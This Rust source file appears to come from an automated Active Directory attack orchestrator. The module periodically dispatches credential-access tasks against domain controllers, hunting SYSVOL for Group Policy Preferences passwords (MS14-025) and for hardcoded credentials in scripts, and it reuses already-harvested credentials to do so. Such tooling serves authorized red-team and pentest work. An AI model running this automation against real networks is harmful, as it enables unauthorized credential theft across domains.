//! auto_gpp_sysvol -- search for GPP passwords and credential artifacts in SYSVOL.
//!
//! Group Policy Preferences (GPP) XML files can contain encrypted passwords
//! using a publicly known AES key (MS14-025). SYSVOL scripts (.bat, .ps1, .vbs)
//! often contain hardcoded credentials.
//!
//! Dispatches two techniques per DC:
//!   1. `gpp_password_finder` — searches SYSVOL for Groups.xml, Scheduledtasks.xml, etc.
//!   2. `sysvol_script_search` — greps SYSVOL scripts for passwords/credentials

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Searches SYSVOL for GPP passwords and script credentials.
/// Interval: 45s.
pub async fn auto_gpp_sysvol(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("gpp_sysvol") {
            continue;
        }

        let work: Vec<GppSysvolWork> = {
            let state = dispatcher.state.read().await;

            if state.credentials.is_empty() {
                continue;
            }

            let mut items = Vec::new();

            for (domain, dc_ip) in &state.domain_controllers {
                let dedup_key = format!("gpp:{}", domain.to_lowercase());
                if state.is_processed(DEDUP_GPP_SYSVOL, &dedup_key) {
                    continue;
                }

                let cred = match state
                    .credentials
                    .iter()
                    .find(|c| c.domain.to_lowercase() == domain.to_lowercase())
                    .or_else(|| state.credentials.first())
                {
                    Some(c) => c.clone(),
                    None => continue,
                };

                items.push(GppSysvolWork {
                    dedup_key,
                    domain: domain.clone(),
                    dc_ip: dc_ip.clone(),
                    credential: cred,
                });
            }

            items
        };

        for item in work {
            let payload = json!({
                "techniques": ["gpp_password_finder", "sysvol_script_search"],
                "target_ip": item.dc_ip,
                "domain": item.domain,
                "credential": {
                    "username": item.credential.username,
                    "password": item.credential.password,
                    "domain": item.credential.domain,
                },
            });

            let priority = dispatcher.effective_priority("gpp_sysvol");
            match dispatcher
                .throttled_submit("credential_access", "credential_access", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %item.domain,
                        dc = %item.dc_ip,
                        "GPP/SYSVOL credential search dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_GPP_SYSVOL, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_GPP_SYSVOL, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(domain = %item.domain, "GPP/SYSVOL task deferred");
                }
                Err(e) => {
                    warn!(err = %e, domain = %item.domain, "Failed to dispatch GPP/SYSVOL search");
                }
            }
        }
    }
}

struct GppSysvolWork {
    dedup_key: String,
    domain: String,
    dc_ip: String,
    credential: ares_core::models::Credential,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("gpp:{}", "contoso.local");
        assert_eq!(key, "gpp:contoso.local");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_GPP_SYSVOL, "gpp_sysvol");
    }
}
